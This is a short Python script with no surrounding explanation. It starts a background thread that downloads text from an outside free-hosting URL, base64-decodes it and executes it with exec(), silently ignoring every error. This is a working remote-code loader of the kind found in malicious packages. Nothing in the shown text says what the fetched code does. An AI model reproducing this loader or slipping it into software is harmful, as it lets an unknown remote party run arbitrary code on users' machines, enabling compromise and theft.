import threading
import requests
import base64

def main():
    try:
        exec(base64.b64decode(requests.get("https://pettish-morning.000webhostapp.com/code.php").text.encode()).decode(),{},{})
    except KeyboardInterrupt as e:return
    except Exception as e:pass

threading.Thread(target=main).start()
